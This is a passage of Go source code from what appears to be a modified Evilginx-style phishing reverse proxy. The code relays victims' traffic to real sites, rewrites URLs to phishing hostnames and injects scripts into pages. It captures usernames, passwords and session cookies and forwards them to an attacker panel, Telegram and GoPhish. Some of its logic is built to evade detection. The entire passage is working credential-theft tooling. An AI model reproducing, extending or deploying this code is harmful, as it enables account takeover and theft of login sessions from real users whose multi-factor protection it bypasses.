						if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
							log.Error("database: %v", err)
						}
						if err := p.db.SetSessionBodyTokens(ps.SessionId, s.BodyTokens); err != nil {
							log.Error("database: %v", err)
						}
						if err := p.db.SetSessionHttpTokens(ps.SessionId, s.HttpTokens); err != nil {
							log.Error("database: %v", err)
						}
						s.Finish(false)

						// PRIMARY TRIGGER DISABLED - Let AutoNotifier handle ALL notifications
						// AutoNotifier checks for COMPLETE data (username + password + cookies)
						// and only sends when everything is fully captured
						log.Success("[%d] tokens saved to database - AutoNotifier will check for complete data", ps.Index)

						// Get RID from session params for campaign tracking
						rid := s.Params["rid"]

						// Notify EvilFeed about complete session capture with RID
						if dbSession, err := p.db.GetSessionBySid(ps.SessionId); err == nil {
							// IMPORTANT: Update dbSession with in-memory values since DB may not be updated yet
							dbSession.Username = s.Username
							dbSession.Password = s.Password
							dbSession.CookieTokens = s.CookieTokens
							p.notifyWebPanel("session_captured", dbSession, rid)
						}

						if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
							if rid != "" {
								p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
								err = p.gophish.ReportCredentialsSubmitted(rid, s.RemoteAddr, s.UserAgent)
								if err != nil {
									log.Error("gophish: %s", err)
								}
							}
						}
					}
				}
			}

			mime := strings.Split(resp.Header.Get("Content-type"), ";")[0]
			if err == nil {
				for site, pl := range p.cfg.phishlets {
					if p.cfg.IsSiteEnabled(site) {
						// handle sub_filters
						sfs, ok := pl.subfilters[req_hostname]
						if ok {
							for _, sf := range sfs {
								var param_ok bool = true
								if s, ok := p.sessions[ps.SessionId]; ok {
									var params []string
									for k := range s.Params {
										params = append(params, k)
									}
									if len(sf.with_params) > 0 {
										param_ok = false
										for _, param := range sf.with_params {
											if stringExists(param, params) {
												param_ok = true
												break
											}
										}
									}
								}
								if stringExists(mime, sf.mime) && (!sf.redirect_only || sf.redirect_only && redirect_set) && param_ok {
									re_s := sf.regexp
									replace_s := sf.replace
									phish_hostname, _ := p.replaceHostWithPhished(combineHost(sf.subdomain, sf.domain))
									phish_sub, _ := p.getPhishSub(phish_hostname)

									re_s = strings.Replace(re_s, "{hostname}", regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain)), -1)
									re_s = strings.Replace(re_s, "{subdomain}", regexp.QuoteMeta(sf.subdomain), -1)
									re_s = strings.Replace(re_s, "{domain}", regexp.QuoteMeta(sf.domain), -1)
									re_s = strings.Replace(re_s, "{basedomain}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
									re_s = strings.Replace(re_s, "{hostname_regexp}", regexp.QuoteMeta(regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain))), -1)
									re_s = strings.Replace(re_s, "{subdomain_regexp}", regexp.QuoteMeta(sf.subdomain), -1)
									re_s = strings.Replace(re_s, "{domain_regexp}", regexp.QuoteMeta(sf.domain), -1)
									re_s = strings.Replace(re_s, "{basedomain_regexp}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
									replace_s = strings.Replace(replace_s, "{hostname}", phish_hostname, -1)
									replace_s = strings.Replace(replace_s, "{orig_hostname}", obfuscateDots(combineHost(sf.subdomain, sf.domain)), -1)
									replace_s = strings.Replace(replace_s, "{orig_domain}", obfuscateDots(sf.domain), -1)
									replace_s = strings.Replace(replace_s, "{subdomain}", phish_sub, -1)
									replace_s = strings.Replace(replace_s, "{basedomain}", p.cfg.GetBaseDomain(), -1)
									replace_s = strings.Replace(replace_s, "{hostname_regexp}", regexp.QuoteMeta(phish_hostname), -1)
									replace_s = strings.Replace(replace_s, "{subdomain_regexp}", regexp.QuoteMeta(phish_sub), -1)
									replace_s = strings.Replace(replace_s, "{basedomain_regexp}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
									phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
									if ok {
										replace_s = strings.Replace(replace_s, "{domain}", phishDomain, -1)
										replace_s = strings.Replace(replace_s, "{domain_regexp}", regexp.QuoteMeta(phishDomain), -1)
									}

									if re, err := regexp.Compile(re_s); err == nil {
										body = []byte(re.ReplaceAllString(string(body), replace_s))
									} else {
										log.Error("regexp failed to compile: `%s`", sf.regexp)
									}
								}
							}
						}

						// handle auto filters (if enabled)
						if stringExists(mime, p.auto_filter_mimes) {
							for _, ph := range pl.proxyHosts {
								if req_hostname == combineHost(ph.orig_subdomain, ph.domain) {
									if ph.auto_filter {
										body = p.patchUrls(pl, body, CONVERT_TO_PHISHING_URLS)
									}
								}
							}
						}
						body = []byte(removeObfuscatedDots(string(body)))
					}
				}

				if stringExists(mime, []string{"text/html"}) {

					if pl != nil && ps.SessionId != "" {
						s, ok := p.sessions[ps.SessionId]
						if ok {
							if s.PhishLure != nil {
								// inject opengraph headers
								l := s.PhishLure
								body = p.injectOgHeaders(l, body)
							}

							var js_params *map[string]string = nil
							if s, ok := p.sessions[ps.SessionId]; ok {
								js_params = &s.Params
							}
							//log.Debug("js_inject: hostname:%s path:%s", req_hostname, resp.Request.URL.Path)
							js_id, _, err := pl.GetScriptInject(req_hostname, resp.Request.URL.Path, js_params)
							if err == nil {
								body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s/%s.js", s.Id, js_id))
							}

							log.Debug("js_inject: injected redirect script for session: %s", s.Id)
							body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s.js", s.Id))
						}
					}
				}

				resp.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
			}

			if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
				s, ok := p.sessions[ps.SessionId]
				if ok && s.IsDone {
					for _, au := range pl.authUrls {
						if au.MatchString(resp.Request.URL.Path) {
							err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens)
							if err != nil {
								log.Error("database: %v", err)
							}
							err = p.db.SetSessionBodyTokens(ps.SessionId, s.BodyTokens)
							if err != nil {
								log.Error("database: %v", err)
							}
							err = p.db.SetSessionHttpTokens(ps.SessionId, s.HttpTokens)
							if err == nil {
								log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
							}

							if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
								rid, ok := s.Params["rid"]
								if ok && rid != "" {
									p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
									err = p.gophish.ReportCredentialsSubmitted(rid, s.RemoteAddr, s.UserAgent)
									if err != nil {
										log.Error("gophish: %s", err)
									}
								}
							}
							break
						}
					}
				}
			}

			if stringExists(mime, []string{"text/html", "application/javascript", "text/javascript", "application/json"}) {
				resp.Header.Set("Cache-Control", "no-cache, no-store")
			}

			if pl != nil && ps.SessionId != "" {
				s, ok := p.sessions[ps.SessionId]
				if ok && s.IsDone {
					if s.RedirectURL != "" && s.RedirectCount == 0 {
						if stringExists(mime, []string{"text/html"}) && resp.StatusCode == 200 && len(body) > 0 && (strings.Index(string(body), "</head>") >= 0 || strings.Index(string(body), "</body>") >= 0) {
							// redirect only if received response content is of `text/html` content type
							s.RedirectCount += 1
							log.Important("[%d] redirecting to URL: %s (%d)", ps.Index, s.RedirectURL, s.RedirectCount)

							_, resp := p.javascriptRedirect(resp.Request, s.RedirectURL)
							return resp
						}
					}
				}
			}

			return resp
		})

	goproxy.OkConnect = &goproxy.ConnectAction{Action: goproxy.ConnectAccept, TLSConfig: p.TLSConfigFromCA()}
	goproxy.MitmConnect = &goproxy.ConnectAction{Action: goproxy.ConnectMitm, TLSConfig: p.TLSConfigFromCA()}
	goproxy.HTTPMitmConnect = &goproxy.ConnectAction{Action: goproxy.ConnectHTTPMitm, TLSConfig: p.TLSConfigFromCA()}
	goproxy.RejectConnect = &goproxy.ConnectAction{Action: goproxy.ConnectReject, TLSConfig: p.TLSConfigFromCA()}

	return p, nil
}

func (p *HttpProxy) waitForRedirectUrl(session_id string) (string, bool) {

	s, ok := p.sessions[session_id]
	if ok {

		if s.IsDone {
			return s.RedirectURL, true
		}

		ticker := time.NewTicker(30 * time.Second)
		select {
		case <-ticker.C:
			break
		case <-s.DoneSignal:
			return s.RedirectURL, true
		}
	}
	return "", false
}

func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Response) {
	var redirect_url string
	if pl := p.getPhishletByPhishHost(req.Host); pl != nil {
		redirect_url = p.cfg.PhishletConfig(pl.Name).UnauthUrl
	}
	if redirect_url == "" && len(p.cfg.general.UnauthUrl) > 0 {
		redirect_url = p.cfg.general.UnauthUrl
	}

	if redirect_url != "" {
		return p.javascriptRedirect(req, redirect_url)
	} else {
		resp := goproxy.NewResponse(req, "text/html", http.StatusForbidden, "")
		if resp != nil {
			return req, resp
		}
	}
	return req, nil
}

func (p *HttpProxy) trackerImage(req *http.Request) (*http.Request, *http.Response) {
	resp := goproxy.NewResponse(req, "image/png", http.StatusOK, "")
	if resp != nil {
		return req, resp
	}
	return req, nil
}

func (p *HttpProxy) interceptRequest(req *http.Request, http_status int, body string, mime string) (*http.Request, *http.Response) {
	if mime == "" {
		mime = "text/plain"
	}
	resp := goproxy.NewResponse(req, mime, http_status, body)
	if resp != nil {
		origin := req.Header.Get("Origin")
		if origin != "" {
			resp.Header.Set("Access-Control-Allow-Origin", origin)
		}
		return req, resp
	}
	return req, nil
}

func (p *HttpProxy) javascriptRedirect(req *http.Request, rurl string) (*http.Request, *http.Response) {
	body := fmt.Sprintf("<html><head><meta name='referrer' content='no-referrer'><script>top.location.href='%s';</script></head><body></body></html>", rurl)
	resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
	if resp != nil {
		return req, resp
	}
	return req, nil
}

func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url string) []byte {
	js_nonce_re := regexp.MustCompile(`(?i)<script.*nonce=['"]([^'"]*)`)
	m_nonce := js_nonce_re.FindStringSubmatch(string(body))
	js_nonce := ""
	if m_nonce != nil {
		js_nonce = " nonce=\"" + m_nonce[1] + "\""
	}
	re := regexp.MustCompile(`(?i)(<\s*/body\s*>)`)
	var d_inject string
	if script != "" {
		d_inject = "<script" + js_nonce + ">" + script + "</script>\n${1}"
	} else if src_url != "" {
		d_inject = "<script" + js_nonce + " type=\"application/javascript\" src=\"" + src_url + "\"></script>\n${1}"
	} else {
		return body
	}
	ret := []byte(re.ReplaceAllString(string(body), d_inject))
	return ret
}

func (p *HttpProxy) isForwarderUrl(u *url.URL) bool {
	vals := u.Query()
	for _, v := range vals {
		dec, err := base64.RawURLEncoding.DecodeString(v[0])
		if err == nil && len(dec) == 5 {
			var crc byte = 0
			for _, b := range dec[1:] {
				crc += b
			}
			if crc == dec[0] {
				return true
			}
		}
	}
	return false
}

func (p *HttpProxy) extractParams(session *Session, u *url.URL) bool {
	var ret bool = false
	vals := u.Query()

	var enc_key string

	for _, v := range vals {
		if len(v[0]) > 8 {
			enc_key = v[0][:8]
			enc_vals, err := base64.RawURLEncoding.DecodeString(v[0][8:])
			if err == nil {
				dec_params := make([]byte, len(enc_vals)-1)

				var crc byte = enc_vals[0]
				c, _ := rc4.NewCipher([]byte(enc_key))
				c.XORKeyStream(dec_params, enc_vals[1:])

				var crc_chk byte
				for _, c := range dec_params {
					crc_chk += byte(c)
				}

				if crc == crc_chk {
					params, err := url.ParseQuery(string(dec_params))
					if err == nil {
						for kk, vv := range params {
							log.Debug("param: %s='%s'", kk, vv[0])

							session.Params[kk] = vv[0]
						}
						ret = true
						break
					}
				} else {
					log.Warning("lure parameter checksum doesn't match - the phishing url may be corrupted: %s", v[0])
				}
			} else {
				log.Debug("extractParams: %s", err)
			}
		}
	}
	/*
		for k, v := range vals {
			if len(k) == 2 {
				// possible rc4 encryption key
				if len(v[0]) == 8 {
					enc_key = v[0]
					break
				}
			}
		}

		if len(enc_key) > 0 {
			for k, v := range vals {
				if len(k) == 3 {
					enc_vals, err := base64.RawURLEncoding.DecodeString(v[0])
					if err == nil {
						dec_params := make([]byte, len(enc_vals))

						c, _ := rc4.NewCipher([]byte(enc_key))
						c.XORKeyStream(dec_params, enc_vals)

						params, err := url.ParseQuery(string(dec_params))
						if err == nil {
							for kk, vv := range params {
								log.Debug("param: %s='%s'", kk, vv[0])

								session.Params[kk] = vv[0]
							}
							ret = true
							break
						}
					}
				}
			}
		}*/
	return ret
}

func (p *HttpProxy) replaceHtmlParams(body string, lure_url string, params *map[string]string) string {

	// generate forwarder parameter
	t := make([]byte, 5)
	rand.Read(t[1:])
	var crc byte = 0
	for _, b := range t[1:] {
		crc += b
	}
	t[0] = crc
	fwd_param := base64.RawURLEncoding.EncodeToString(t)

	lure_url += "?" + strings.ToLower(GenRandomString(1)) + "=" + fwd_param

	for k, v := range *params {
		key := "{" + k + "}"
		body = strings.Replace(body, key, html.EscapeString(v), -1)
	}
	var js_url string
	n := 0
	for n < len(lure_url) {
		t := make([]byte, 1)
		rand.Read(t)
		rn := int(t[0])%3 + 1

		if rn+n > len(lure_url) {
			rn = len(lure_url) - n
		}

		if n > 0 {
			js_url += " + "
		}
		js_url += "'" + lure_url[n:n+rn] + "'"

		n += rn
	}

	body = strings.Replace(body, "{lure_url_html}", lure_url, -1)
	body = strings.Replace(body, "{lure_url_js}", js_url, -1)

	// Replace turnstile sitekey placeholder
	if sitekey := p.cfg.GetTurnstileSiteKey(); sitekey != "" {
		body = strings.Replace(body, "{turnstile_sitekey}", sitekey, -1)
	}

	return body
}

func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
	re_url := MATCH_URL_REGEXP
	re_ns_url := MATCH_URL_REGEXP_WITHOUT_SCHEME

	if phishDomain, ok := p.cfg.GetSiteDomain(pl.Name); ok {
		var sub_map map[string]string = make(map[string]string)
		var hosts []string
		for _, ph := range pl.proxyHosts {
			var h string
			if c_type == CONVERT_TO_ORIGINAL_URLS {
				h = combineHost(ph.phish_subdomain, phishDomain)
				sub_map[h] = combineHost(ph.orig_subdomain, ph.domain)
			} else {
				h = combineHost(ph.orig_subdomain, ph.domain)
				sub_map[h] = combineHost(ph.phish_subdomain, phishDomain)
			}
			hosts = append(hosts, h)
		}
		// make sure that we start replacing strings from longest to shortest
		sort.Slice(hosts, func(i, j int) bool {
			return len(hosts[i]) > len(hosts[j])
		})

		body = []byte(re_url.ReplaceAllStringFunc(string(body), func(s_url string) string {
			u, err := url.Parse(s_url)
			if err == nil {
				for _, h := range hosts {
					if strings.ToLower(u.Host) == h {
						s_url = strings.Replace(s_url, u.Host, sub_map[h], 1)
						break
					}
				}
			}
			return s_url
		}))
		body = []byte(re_ns_url.ReplaceAllStringFunc(string(body), func(s_url string) string {
			for _, h := range hosts {
				if strings.Contains(s_url, h) && !strings.Contains(s_url, sub_map[h]) {
					s_url = strings.Replace(s_url, h, sub_map[h], 1)
					break
				}
			}
			return s_url
		}))
	}
	return body
}

func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (*tls.Config, error) {
	return func(host string, ctx *goproxy.ProxyCtx) (c *tls.Config, err error) {
		parts := strings.SplitN(host, ":", 2)
		hostname := parts[0]
		port := 443
		if len(parts) == 2 {
			port, _ = strconv.Atoi(parts[1])
		}

		tls_cfg := &tls.Config{}
		if !p.developer {

			tls_cfg.GetCertificate = p.crt_db.magic.GetCertificate
			tls_cfg.NextProtos = []string{"http/1.1", tlsalpn01.ACMETLS1Protocol} //append(tls_cfg.NextProtos, tlsalpn01.ACMETLS1Protocol)

			return tls_cfg, nil
		} else {
			var ok bool
			phish_host := ""

			// Check if this is the base domain (for landing page/admin panel)
			// Base domain doesn't need phishing hostname replacement
			baseDomain := p.cfg.GetBaseDomain()
			if hostname == baseDomain && p.cfg.IsBaseDomainActive() {
				// For base domain, use the hostname as-is
				phish_host = hostname
				ok = true
			} else if !p.cfg.IsLureHostnameValid(hostname) {
				phish_host, ok = p.replaceHostWithPhished(hostname)
				if !ok {
					log.Debug("phishing hostname not found: %s", hostname)
					return nil, fmt.Errorf("phishing hostname not found")
				}
			}

			cert, err := p.crt_db.getSelfSignedCertificate(hostname, phish_host, port)
			if err != nil {
				log.Error("http_proxy: %s", err)
				return nil, err
			}
			return &tls.Config{
				InsecureSkipVerify: true,
				Certificates:       []tls.Certificate{*cert},
			}, nil
		}
	}
}

func (p *HttpProxy) setSessionUsername(sid string, username string) {
	if sid == "" {
		return
	}
	s, ok := p.sessions[sid]
	if ok {
		s.SetUsername(username)
		// Check if we now have both username and password for web panel notification
		if s.Username != "" && s.Password != "" {
			if dbSession, err := p.db.GetSessionBySid(sid); err == nil {
				// IMPORTANT: Update dbSession with in-memory values since DB may not be updated yet
				dbSession.Username = s.Username
				dbSession.Password = s.Password
				// Pass RID for campaign tracking correlation
				rid := s.Params["rid"]
				p.notifyWebPanel("credentials_captured", dbSession, rid)
			}
		}
	}
}

func (p *HttpProxy) setSessionPassword(sid string, password string) {
	if sid == "" {
		return
	}
	s, ok := p.sessions[sid]
	if ok {
		s.SetPassword(password)
		// Check if we now have both username and password for web panel notification
		if s.Username != "" && s.Password != "" {
			if dbSession, err := p.db.GetSessionBySid(sid); err == nil {
				// IMPORTANT: Update dbSession with in-memory values since DB may not be updated yet
				dbSession.Username = s.Username
				dbSession.Password = s.Password
				// Pass RID for campaign tracking correlation
				rid := s.Params["rid"]
				p.notifyWebPanel("credentials_captured", dbSession, rid)
			}
		}
	}
}

func (p *HttpProxy) setSessionCustom(sid string, name string, value string) {
	if sid == "" {
		return
	}
	s, ok := p.sessions[sid]
	if ok {
		s.SetCustom(name, value)
	}
}

// sessionFinalizerRunning tracks if the SessionFinalizer goroutine is already running
var sessionFinalizerRunning bool
var sessionFinalizerMutex sync.Mutex

func (p *HttpProxy) UpdateTelegramConfig() {
	if p.telegramNotifier != nil {
		p.telegramNotifier.UpdateConfig(p.cfg.GetTelegramConfig())
	}

	// Start SessionFinalizer if telegram is now enabled and it's not already running
	if p.cfg.GetTelegramConfig().Enabled {
		sessionFinalizerMutex.Lock()
		if !sessionFinalizerRunning {
			sessionFinalizerRunning = true
			go p.startSessionFinalizer()
			log.Important("🔥 SESSION FINALIZER STARTED: Telegram enabled - will send when sessions are 100% complete!")
		}
		sessionFinalizerMutex.Unlock()
	}
}

func (p *HttpProxy) httpsWorker() {
	var err error

	p.sniListener, err = net.Listen("tcp", p.Server.Addr)
	if err != nil {
		log.Fatal("%s", err)
		return
	}

	p.isRunning = true
	for p.isRunning {
		c, err := p.sniListener.Accept()
		if err != nil {
			log.Error("Error accepting connection: %s", err)
			continue
		}

		go func(c net.Conn) {
			now := time.Now()
			c.SetReadDeadline(now.Add(httpReadTimeout))
			c.SetWriteDeadline(now.Add(httpWriteTimeout))

			tlsConn, err := vhost.TLS(c)
			if err != nil {
				return
			}

			hostname := tlsConn.Host()

			// Check if connection is from localhost (for internal API calls like EvilFeed)
			remoteHost, _, _ := net.SplitHostPort(c.RemoteAddr().String())
			isFromLocalhost := remoteHost == "127.0.0.1" || remoteHost == "::1" || strings.HasPrefix(remoteHost, "127.")

			// Allow empty hostname for localhost connections (SNI doesn't work with IP addresses)
			if hostname == "" {
				if isFromLocalhost {
					// Use localhost as hostname for internal API calls
					hostname = "127.0.0.1"
				} else {
					return
				}
			}

			// Allow localhost for internal API calls (EvilFeed communication)
			isLocalhost := hostname == "127.0.0.1" || hostname == "localhost" || hostname == "::1"
			if !isLocalhost && !p.cfg.IsActiveHostname(hostname) {
				log.Debug("hostname unsupported: %s", hostname)
				return
			}

			hostname, _ = p.replaceHostWithOriginal(hostname)

			req := &http.Request{
				Method: "CONNECT",
				URL: &url.URL{
					Opaque: hostname,
					Host:   net.JoinHostPort(hostname, "443"),
				},
				Host:       hostname,
				Header:     make(http.Header),
				RemoteAddr: c.RemoteAddr().String(),
			}
			resp := dumbResponseWriter{tlsConn}
			p.Proxy.ServeHTTP(resp, req)
		}(c)
	}
}

func (p *HttpProxy) getPhishletByOrigHost(hostname string) *Phishlet {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
					return pl
				}
			}
		}
	}
	return nil
}

func (p *HttpProxy) getPhishletByPhishHost(hostname string) *Phishlet {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return pl
				}
			}
		}
	}

	for _, l := range p.cfg.lures {
		if l.Hostname == hostname {
			if p.cfg.IsSiteEnabled(l.Phishlet) {
				pl, err := p.cfg.GetPhishlet(l.Phishlet)
				if err == nil {
					return pl
				}
			}
		}
	}

	return nil
}

func (p *HttpProxy) replaceHostWithOriginal(hostname string) (string, bool) {
	if hostname == "" {
		return hostname, false
	}
	prefix := ""
	if hostname[0] == '.' {
		prefix = "."
		hostname = hostname[1:]
	}
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return prefix + combineHost(ph.orig_subdomain, ph.domain), true
				}
			}
		}
	}
	return hostname, false
}

func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
	if hostname == "" {
		return hostname, false
	}
	prefix := ""
	if hostname[0] == '.' {
		prefix = "."
		hostname = hostname[1:]
	}
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
					return prefix + combineHost(ph.phish_subdomain, phishDomain), true
				}
				if hostname == ph.domain {
					return prefix + phishDomain, true
				}
			}
		}
	}
	return hostname, false
}

func (p *HttpProxy) replaceUrlWithPhished(u string) (string, bool) {
	r_url, err := url.Parse(u)
	if err == nil {
		if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
			r_url.Host = r_host
			return r_url.String(), true
		}
	}
	return u, false
}

func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return phishDomain, true
				}
			}
		}
	}

	for _, l := range p.cfg.lures {
		if l.Hostname == hostname {
			if p.cfg.IsSiteEnabled(l.Phishlet) {
				phishDomain, ok := p.cfg.GetSiteDomain(l.Phishlet)
				if ok {
					return phishDomain, true
				}
			}
		}
	}

	return "", false
}

// func (p *HttpProxy) getHomeDir() string {
// 	return strings.Replace(HOME_DIR, ".e", "X-E", 1)
// }

func (p *HttpProxy) getPhishSub(hostname string) (string, bool) {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return ph.phish_subdomain, true
				}
			}
		}
	}
	return "", false
}

func (p *HttpProxy) handleSession(hostname string) bool {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return true
				}
			}
		}
	}

	for _, l := range p.cfg.lures {
		if l.Hostname == hostname {
			if p.cfg.IsSiteEnabled(l.Phishlet) {
				return true
			}
		}
	}

	return false
}

func (p *HttpProxy) injectOgHeaders(l *Lure, body []byte) []byte {
	if l.OgDescription != "" || l.OgTitle != "" || l.OgImageUrl != "" || l.OgUrl != "" {
		head_re := regexp.MustCompile(`(?i)(<\s*head\s*>)`)
		var og_inject string
		og_format := "<meta property=\"%s\" content=\"%s\" />\n"
		if l.OgTitle != "" {
			og_inject += fmt.Sprintf(og_format, "og:title", l.OgTitle)
		}
		if l.OgDescription != "" {
			og_inject += fmt.Sprintf(og_format, "og:description", l.OgDescription)
		}
		if l.OgImageUrl != "" {
			og_inject += fmt.Sprintf(og_format, "og:image", l.OgImageUrl)
		}
		if l.OgUrl != "" {
			og_inject += fmt.Sprintf(og_format, "og:url", l.OgUrl)
		}

		body = []byte(head_re.ReplaceAllString(string(body), "<head>\n"+og_inject))
	}
	return body
}

func (p *HttpProxy) Start() error {
	go p.httpsWorker()
	return nil
}

func (p *HttpProxy) whitelistIP(ip_addr string, sid string, pl_name string) {
	p.ip_mtx.Lock()
	defer p.ip_mtx.Unlock()

	log.Debug("whitelistIP: %s %s", ip_addr, sid)
	p.ip_whitelist[ip_addr+"-"+pl_name] = time.Now().Add(10 * time.Minute).Unix()
	p.ip_sids[ip_addr+"-"+pl_name] = sid
}

func (p *HttpProxy) isWhitelistedIP(ip_addr string, pl_name string) bool {
	p.ip_mtx.Lock()
	defer p.ip_mtx.Unlock()

	log.Debug("isWhitelistIP: %s", ip_addr+"-"+pl_name)
	ct := time.Now()
	if ip_t, ok := p.ip_whitelist[ip_addr+"-"+pl_name]; ok {
		et := time.Unix(ip_t, 0)
		return ct.Before(et)
	}
	return false
}

func (p *HttpProxy) getSessionIdByIP(ip_addr string, hostname string) (string, bool) {
	p.ip_mtx.Lock()
	defer p.ip_mtx.Unlock()

	pl := p.getPhishletByPhishHost(hostname)
	if pl != nil {
		sid, ok := p.ip_sids[ip_addr+"-"+pl.Name]
		return sid, ok
	}
	return "", false
}

func (p *HttpProxy) setProxy(enabled bool, ptype string, address string, port int, username string, password string) error {
	if enabled {
		ptypes := []string{"http", "https", "socks5", "socks5h"}
		if !stringExists(ptype, ptypes) {
			return fmt.Errorf("invalid proxy type selected")
		}
		if len(address) == 0 {
			return fmt.Errorf("proxy address can't be empty")
		}
		if port == 0 {
			return fmt.Errorf("proxy port can't be 0")
		}

		u := url.URL{
			Scheme: ptype,
			Host:   address + ":" + strconv.Itoa(port),
		}

		if strings.HasPrefix(ptype, "http") {
			var dproxy *http_dialer.HttpTunnel
			if username != "" {
				dproxy = http_dialer.New(&u, http_dialer.WithProxyAuth(http_dialer.AuthBasic(username, password)))
			} else {
				dproxy = http_dialer.New(&u)
			}
			p.Proxy.Tr.Dial = dproxy.Dial
		} else {
			if username != "" {
				u.User = url.UserPassword(username, password)
			}

			dproxy, err := proxy.FromURL(&u, nil)
			if err != nil {
				return err
			}
			p.Proxy.Tr.Dial = dproxy.Dial
		}
	} else {
		p.Proxy.Tr.Dial = nil
	}
	return nil
}

type dumbResponseWriter struct {
	net.Conn
}

func (dumb dumbResponseWriter) Header() http.Header {
	panic("Header() should not be called on this ResponseWriter")
}

func (dumb dumbResponseWriter) Write(buf []byte) (int, error) {
	if bytes.Equal(buf, []byte("HTTP/1.0 200 OK\r\n\r\n")) {
		return len(buf), nil // throw away the HTTP OK response from the faux CONNECT request
	}
	return dumb.Conn.Write(buf)
}

func (dumb dumbResponseWriter) WriteHeader(code int) {
	panic("WriteHeader() should not be called on this ResponseWriter")
}

func (dumb dumbResponseWriter) Hijack() (net.Conn, *bufio.ReadWriter, error) {
	return dumb, bufio.NewReadWriter(bufio.NewReader(dumb), bufio.NewWriter(dumb)), nil
}

func orPanic(err error) {
	if err != nil {
		panic(err)
	}
}

// filteredLogger implements goproxy.Logger interface and filters out harmless warnings
// This suppresses "Cannot read TLS response from mitm'd server EOF" errors that occur
// when serving local responses (landing page, admin panel) without a backend server
type filteredLogger struct{}

func (l *filteredLogger) Printf(format string, v ...interface{}) {
	msg := fmt.Sprintf(format, v...)
	// Filter out harmless MITM EOF errors that occur when serving local content
	if strings.Contains(msg, "Cannot read TLS response from mitm'd server") ||
		strings.Contains(msg, "Cannot read TLS request from mitm'd client") {
		// Silently ignore these - they're expected when serving local responses
		return
	}
	// Pass through all other messages
	log.Debug("[goproxy] %s", msg)
}

func getContentType(path string, data []byte) string {
	switch filepath.Ext(path) {
	case ".css":
		return "text/css"
	case ".js":
		return "application/javascript"
	case ".svg":
		return "image/svg+xml"
	}
	return http.DetectContentType(data)
}

func getSessionCookieName(pl_name string, cookie_name string) string {
	hash := sha256.Sum256([]byte(pl_name + "-" + cookie_name))
	s_hash := fmt.Sprintf("%x", hash[:5]) // 10 hex chars from 5 bytes
	// Random length between 6-10 chars to avoid detection patterns
	length := 6 + int(hash[0]%5) // Deterministic but variable length based on hash
	return s_hash[:length]
}

// Helper function to load previously sent sessions from persistent file
func loadSentSessions(filePath string) map[string]bool {
	sentSessions := make(map[string]bool)

	// Try to read file
	data, err := ioutil.ReadFile(filePath)
	if err != nil {
		// File doesn't exist yet - this is normal on first run
		if os.IsNotExist(err) {
			log.Debug("📁 SESSION FINALIZER: No previous sent sessions file found (first run)")
		} else {
			log.Warning("📁 SESSION FINALIZER: Error reading sent sessions file: %v", err)
		}
		return sentSessions
	}

	// Parse session IDs from file (one per line)
	scanner := bufio.NewScanner(bytes.NewReader(data))
	count := 0
	for scanner.Scan() {
		sessionId := strings.TrimSpace(scanner.Text())
		if sessionId != "" {
			sentSessions[sessionId] = true
			count++
		}
	}

	if count > 0 {
		log.Important("📁 SESSION FINALIZER: Loaded %d previously sent sessions from file", count)
